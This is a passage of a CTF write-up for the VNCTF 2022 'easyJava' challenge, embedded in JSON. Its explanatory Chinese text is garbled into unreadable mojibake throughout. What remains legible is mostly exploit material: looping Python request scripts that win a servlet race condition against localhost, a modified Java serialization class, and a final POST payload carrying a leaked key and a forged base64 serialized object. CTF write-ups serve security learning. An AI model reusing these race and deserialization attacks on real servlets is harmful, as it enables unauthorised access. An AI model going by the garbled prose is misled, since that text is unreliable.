resp.getOutputStream();\rout.write(outStr.getBytes());\rout.flush();\rout.close();\r}\r}\rçœ‹åˆ°è¿™é‡Œå‘ç°è¿™ä¸ªkeyé€šè¿‡æ­£å¸¸æ‰‹æ®µæ²¡æœ‰åŠæ³•æ‹¿åˆ°ï¼Œä¸ç®¡æ€æ ·éƒ½ä¸å¯èƒ½è¿›elseçš„ã€‚å¼€å§‹æ€è€ƒæœ‰æ²¡æœ‰åˆ«çš„åŠæ³•ã€‚æŸ¥é˜…äº†ä¸€äº›èµ„æ–™é—®é«˜è¡¨å“¥ä¹‹åå‘ç°è¿™é‡Œéœ€è¦æ¡ä»¶ç«äº‰ã€‚è‡³äºä¸ºä»€ä¹ˆå¯ä»¥ç«äº‰ï¼ŒäºŒå¸ˆå‚…çš„çŒœæµ‹åŠ ä¸Šæˆ‘çš„ç†è§£å†åŠ ä¸Šy4å¸ˆå‚…çš„æ€»ç»“ï¼Œå¤§æ¦‚å°±æ˜¯servletåœ¨ä¸€æ®µæ—¶é—´å†…åªå®ä¾‹åŒ–ä¸€æ¬¡ï¼Œå¯¼è‡´å¤šä¸ªç”¨æˆ·ä¼šåŒæ—¶è®¿é—®åˆ°åŒä¸€ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥æŠ¢åœ¨æŸä¸ªservletå®ä¾‹é”€æ¯ä¹‹å‰å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œå°±å¯ä»¥å®ç°ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³çš„æƒ…å†µï¼Œè¿›è€Œæ‹¿åˆ°è¿™ä¸ªkeyã€‚\nimage-20220303215240491\ré™„ä¸Šå†™å¥½çš„åƒåœ¾è„šæœ¬ã€‚\na.py\nimport requests\rhost = \u0026quot;http://localhost:8080/evi1\u0026quot;\rwhile True:\rr = requests.get(host+\u0026quot;?name=qertyyui\u0026quot;)\rb.py\nimport requests\rhost = \u0026quot;http://localhost:8080/evi1\u0026quot;\rwhile True:\rr = requests.get(host+\u0026quot;?name=vnctf2022\u0026quot;)\rif r.text.find(\u0026quot;The Key is\u0026quot;)!=-1:\rprint(r.text)\ræ‹¿åˆ°keyã€‚\nè¿™é‡Œåœ¨ç¬¬äºŒæ¬¡å¤ç°çš„æ—¶å€™å‡ºäº†ä¸€ç‚¹é—®é¢˜ã€‚é—®é¢˜å¤§æ¦‚å‡ºåœ¨pythonçš„requestï¼Œåœ¨å‘èµ·è¯·æ±‚ä¹‹åä¸ä¼šè‡ªåŠ¨å…³é—­è¿æ¥ï¼Œå¦‚æœçŸ­æ—¶é—´å†…å‘èµ·è¯·æ±‚è¿‡å¤šçš„è¯ä¼šä¸€ç›´å ç”¨Httpconnnectionpoolçš„èµ„æºï¼Œå¯¼è‡´ä¹‹åå‘èµ·çš„è¯·æ±‚æ²¡æœ‰åŠæ³•æˆåŠŸè¿æ¥ã€‚å°è¯•äº†å¾ˆå¤šåŠæ³•éƒ½æ²¡æœ‰ç»“å±€ï¼Œä¸è®ºæ˜¯åŠ headerçš„connectionä¸ºcloseï¼Œè¿˜æ˜¯æ§åˆ¶sessionï¼Œéƒ½æ²¡æœ‰ç”¨ã€‚æœ€åé‡‡ç”¨å¤šçº¿ç¨‹çš„åŠæ³•æ‰è§£å†³ã€‚ æ¥ç€å¾€ä¸‹å°±æ˜¯ååºåˆ—åŒ–ï¼Œè¿™é‡Œéœ€è¦postä¸€ä¸ªkeyå’Œbase64ï¼Œå…¶ä¸­base64æ˜¯ä¸€ä¸ªUserç±»åºåˆ—åŒ–ä¹‹åç»è¿‡base64ç¼–ç çš„ç»“æœã€‚SerAndDeç±»é‡Œé¢æä¾›äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•å°è£…ï¼Œå¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨ã€‚\nimage-20220303220931037\ræ³¨æ„åˆ°è¿™é‡Œçš„this.userï¼Œæˆ‘ä»¬ååºåˆ—åŒ–å‡ºæ¥çš„Useréœ€è¦å’Œthis.userç›¸ç­‰ã€‚\nimage-20220304093202982\ré‚£ä¹ˆè¿›Userç±»çœ‹çœ‹ã€‚\npackage entity;\rimport java.io.IOException;\rimport java.io.ObjectInputStream;\rimport java.io.Serializable;\r/* loaded from: User.class */\rpublic class User implements Serializable {\rprivate String name;\rprivate String age;\rprivate transient String height;\rpublic User(String name, String age, String height) {\rthis.name = name;\rthis.age = age;\rthis.height = height;\r}\rpublic String getName() {\rreturn this.name;\r}\rpublic void setName(String name) {\rthis.name = name;\r}\rpublic String getAge() {\rreturn this.age;\r}\rpublic void setAge(String age) {\rthis.age = age;\r}\rpublic String getHeight() {\rreturn this.height;\r}\rpublic void setHeight(String height) {\rthis.height = height;\r}\rprivate void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {\rs.defaultReadObject();\rthis.height = (String) s.readObject();\r}\r@Override // java.lang.Object\rpublic boolean equals(Object obj) {\rif (obj == null) {\rreturn false;\r}\rif (this == obj) {\rreturn true;\r}\rif (!(obj instanceof User)) {\rreturn false;\r}\rUser user = (User) obj;\rif (!user.getAge().equals(this.age) || !user.getHeight().equals(this.height) || !user.getName().equals(this.name)) {\rreturn false;\r}\rreturn true;\r}\r@Override // java.lang.Object\rpublic String toString() {\rreturn \u0026quot;User{name='\u0026quot; + this.name + \u0026quot;', age='\u0026quot; + this.age + \u0026quot;', height='\u0026quot; + this.height + \u0026quot;'}\u0026quot;;\r}\r}\rè¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå¯¹äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¢«transientä¿®é¥°çš„å˜é‡æ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥å¦‚æœä¸ä½œä»»ä½•æ›´æ”¹åºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²å†æ‹¿å»ååºåˆ—åŒ–ï¼Œå¾—åˆ°çš„heightä¼šæ˜¯ä¸ªnullï¼Œè¿™æ ·å°±æ²¡æœ‰åŠæ³•æ»¡è¶³ifæ¡ä»¶ï¼Œæ‹¿ä¸åˆ°flagã€‚æ‰€ä»¥ä¸ºäº†ååºåˆ—åŒ–å‡ºæ¥æ—¶ï¼Œè¿™ä¸ªheightå’Œthis.useré‡Œé¢çš„heightæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥é€šè¿‡é‡å†™writeObjectæ–¹æ³•ï¼Œæ‰‹åŠ¨æŠŠheightå†™è¿›æˆ‘ä»¬ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡é‡Œã€‚\nimage-20220304094934553\rè¿™é‡Œåˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨Userç±»é‡Œé¢é‡å†™äº†readObjectï¼Œè¿™ä¸€è¡Œä»£ç å­˜åœ¨çš„æ—¶å€™ï¼Œååºåˆ—åŒ–ä¸€å®šä¼šå¤±è´¥ï¼Œä½†æ˜¯æ³¨é‡Šæ‰ä¹‹åæ˜¯å¯ä»¥çœ‹åˆ°heightä¸ºnullçš„ã€‚\nthis.height = (String) s.readObject();\råœ¨Userç±»é‡Œé¢é‡å†™ä¸€ä¸ªwriteObject\nprivate void writeObject(ObjectOutputStream s) throws IOException{\rs.defaultWriteObject();\rs.writeObject(\u0026quot;180\u0026quot;);\r}\rè¿™æ ·å°±å¯ä»¥æˆåŠŸè¿›å…¥ifåˆ¤æ–­ï¼Œæ‹¿åˆ°flagã€‚\nè‡ªå·±å†™ä¸€ä¸ªserializeç±»ï¼Œè¾“å‡ºéœ€è¦çš„base64å­—ç¬¦ä¸²ï¼ŒåŒæ—¶æŸ¥çœ‹ä¸€ä¸‹user2çš„å±æ€§æƒ…å†µã€‚\nimport java.io.*;\rimport java.util.Base64;\rimport entity.User;\rimport util.SerAndDe;\rpublic class serialize {\rpublic static void main(String[] args) throws IOException, ClassNotFoundException {\rUser u = new User(\u0026quot;m4n_q1u_666\u0026quot;,\u0026quot;666\u0026quot;,\u0026quot;180\u0026quot;);\rbyte[] user = SerAndDe.serialize(u);\rString poc = Base64.getEncoder().encodeToString(user);\rSystem.out.println(poc);\rbyte[] user2 = Base64.getDecoder().decode(poc);\rSystem.out.println(SerAndDe.deserialize(user2).toString());\r}\r}\rç»“æœå¦‚ä¸‹\nimage-20220304100044543\ræœ¬åœ°æ²¡æœ‰flagï¼Œå‚è€ƒle1aå¸ˆå‚…çš„å¤ç°è¿‡ç¨‹ï¼Œåœ¨æœ¬åœ°å¼¹ä¸ªè®¡ç®—å™¨ã€‚\nimage-20220304100736444\rpayload\nhttp://127.0.0.1:8080/evi1\rpost:key=SjveAUeJxYXPww2Dd0NPwUm90na98of1\u0026amp;base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=\rå¤§åŠŸå‘Šæˆï¼\nimage-20220304101021208\rä¸€äº›å¥‡æ€ªçš„å§¿åŠ¿ ä¹‹å‰æ²¡æœ‰æ­è¿‡tomcatï¼Œæ‰€ä»¥åœ¨æ­å»ºç¯å¢ƒçš„è¿‡ç¨‹ä¸­æœ‰äº›åƒåŠ›ã€‚å®Œæ•´çš„æ­å»ºè¿‡ç¨‹ä¹‹åæœ‰ç©ºäº†åœ¨æå­ï¼Œè¿™é‡Œç”¨çš„åŠæ³•æ˜¯ç”¨ç¼–è¯‘å¥½çš„æ–‡ä»¶æ›¿æ¢æ‰tomcatè‡ªå¸¦çš„ROOTã€‚\nimage-20220302132904237\råœ¨åšçš„è¿‡ç¨‹ä¸­å‘ç°ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªåŠæ³•éª—è¿‡ç¼–è¯‘å™¨ï¼Œå½“ç„¶å‰ææ˜¯éœ€è¦çŸ¥é“ç±»é‡Œæœ‰å“ªäº›æ–¹æ³•ï¼Œå¦åˆ™ä¼šå‡ºç°æ‰¾ä¸åˆ°è°ƒç”¨çš„æ–¹æ³•ä¹‹ç±»çš„é”™è¯¯ã€‚\nå‚è€ƒèµ„æ–™ Le1aå¸ˆå‚…çš„wp\nVNCTF 2022 Official WriteUp\njava-Transientå…³é”®å­—ã€Volatileå…³é”®å­—ä»‹ç»å’Œåºåˆ—åŒ–ã€ååºåˆ—åŒ–æœºåˆ¶ã€å•ä¾‹ç±»åºåˆ—åŒ–\nServletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜\nå†™åœ¨åé¢ è¿™æ˜¯ä¸çŸ¥é“éš”äº†å¤šä¹…ä¹‹åé‡æ–°å¼€å§‹æ‰“æ¯”èµ›ï¼Œå¹¶ä¸”è®¤è®¤çœŸçœŸåœ°å¤ç°ã€‚è™½ç„¶æ¯”èµ›è¿‡ç¨‹ä¸­æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯æˆå°±æ„Ÿæ»¡æ»¡ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚ä½œä¸ºä¸€åä¸åˆæ ¼çš„webæ‰‹ï¼Œåªèƒ½æœŸæœ›æ—¥åå¤špushè‡ªå·±ä¸€ä¸‹ï¼Œå¥½å¥½æ‰“æ¯”èµ›å¥½å¥½å†™é¢˜ï¼Œæœ€é‡è¦çš„æ˜¯è¡¨å“¥ä»¬å¸¦å¸¦æˆ‘(â—\u0026rsquo;â—¡\u0026rsquo;â—)\n","date":"2022-03-04T00:00:00Z","permalink":"https://koali-www.github.io/2022/vnctf2022-easyjava/","title":"VNctf2022-easyJava"}]